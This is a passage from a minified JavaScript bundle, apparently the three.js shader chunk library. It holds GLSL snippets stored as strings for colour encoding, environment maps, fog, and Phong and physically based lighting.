USE_DISPLACEMENTMAP\\n\\ttransformed += normal * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\",emissivemap_fragment:\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\",\nemissivemap_pars_fragment:\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\",encodings_fragment:\"  gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\",encodings_pars_fragment:\"\\nvec4 LinearToLinear( in vec4 value ) {\\n\\treturn value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n\\treturn vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n\\treturn vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n\\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n\\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n\\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n\\tfloat maxComponent = max( max( value.r, value.g ), value.b );\\n\\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n\\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n\\treturn vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n\\tfloat maxRGB = max( value.x, max( value.g, value.b ) );\\n\\tfloat M      = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n\\tM            = ceil( M * 255.0 ) / 255.0;\\n\\treturn vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n\\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n\\tfloat maxRGB = max( value.x, max( value.g, value.b ) );\\n\\tfloat D      = max( maxRange / maxRGB, 1.0 );\\n\\tD            = min( floor( D ) / 255.0, 1.0 );\\n\\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value )  {\\n\\tvec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n\\tXp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n\\tvec4 vResult;\\n\\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n\\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n\\tvResult.w = fract(Le);\\n\\tvResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n\\treturn vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n\\tfloat Le = value.z * 255.0 + value.w;\\n\\tvec3 Xp_Y_XYZp;\\n\\tXp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n\\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n\\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n\\tvec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n\\treturn vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\",\nenvmap_fragment:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#else\\n\\t\\tvec4 envColor = vec4( 0.0 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\",\nenvmap_pars_fragment:\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntensity;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\",\nenvmap_pars_vertex:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\",envmap_vertex:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\",\nfog_vertex:\"\\n#ifdef USE_FOG\\nfogDepth = -mvPosition.z;\\n#endif\",fog_pars_vertex:\"#ifdef USE_FOG\\n  varying float fogDepth;\\n#endif\\n\",fog_fragment:\"#ifdef USE_FOG\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * fogDepth * fogDepth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\",fog_pars_fragment:\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\tvarying float fogDepth;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\\n\",\ngradientmap_pars_fragment:\"#ifdef TOON\\n\\tuniform sampler2D gradientMap;\\n\\tvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\\n\\t\\tfloat dotNL = dot( normal, lightDirection );\\n\\t\\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\\n\\t\\t#ifdef USE_GRADIENTMAP\\n\\t\\t\\treturn texture2D( gradientMap, coord ).rgb;\\n\\t\\t#else\\n\\t\\t\\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",lightmap_fragment:\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\",\nlightmap_pars_fragment:\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\",lights_lambert_vertex:\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",\nlights_pars:\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tdirectLight.color = pointLight.color;\\n\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( angleCos > spotLight.coneCos ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tstruct RectAreaLight {\\n\\t\\tvec3 color;\\n\\t\\tvec3 position;\\n\\t\\tvec3 halfWidth;\\n\\t\\tvec3 halfHeight;\\n\\t};\\n\\tuniform sampler2D ltcMat;\\tuniform sampler2D ltcMag;\\n\\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar - 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV(queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = saturate( reflectVec.y * 0.5 + 0.5 );\\n\\t\\t\\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\",\nlights_phong_fragment:\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\",lights_phong_pars_fragment:\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tvoid RE_Direct_RectArea_BlinnPhong( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t\\tvec3 matDiffColor = material.diffuseColor;\\n\\t\\tvec3 matSpecColor = material.specularColor;\\n\\t\\tvec3 lightColor   = rectAreaLight.color;\\n\\t\\tfloat roughness = BlinnExponentToGGXRoughness( material.specularShininess );\\n\\t\\tvec3 spec = Rect_Area_Light_Specular_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight,\\n\\t\\t\\t\\troughness,\\n\\t\\t\\t\\tltcMat, ltcMag );\\n\\t\\tvec3 diff = Rect_Area_Light_Diffuse_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight );\\n\\t\\treflectedLight.directSpecular += lightColor * matSpecColor * spec / PI2;\\n\\t\\treflectedLight.directDiffuse  += lightColor * matDiffColor * diff / PI2;\\n\\t}\\n#endif\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t#ifdef TOON\\n\\t\\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\\n\\t#else\\n\\t\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\t\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#endif\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_Direct_RectArea\\t\\tRE_Direct_RectArea_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\",\nlights_physical_fragment:\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\",\nlights_physical_pars_fragment:\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nfloat clearCoatDHRApprox( const in float roughness, const in float dotNL ) {\\n\\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\\n}\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t\\tvec3 matDiffColor = material.diffuseColor;\\n\\t\\tvec3 matSpecColor = material.specularColor;\\n\\t\\tvec3 lightColor   = rectAreaLight.color;\\n\\t\\tfloat roughness = material.specularRoughness;\\n\\t\\tvec3 spec = Rect_Area_Light_Specular_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight,\\n\\t\\t\\t\\troughness,\\n\\t\\t\\t\\tltcMat, ltcMag );\\n\\t\\tvec3 diff = Rect_Area_Light_Diffuse_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight );\\n\\t\\treflectedLight.directSpecular += lightColor * matSpecColor * spec;\\n\\t\\treflectedLight.directDiffuse  += lightColor * matDiffColor * diff;\\n\\t}\\n#endif\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\\n\\t#else\\n\\t\\tfloat clearCoatDHR = 0.0;\\n\\t#endif\\n\\treflectedLight.directSpecular += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout 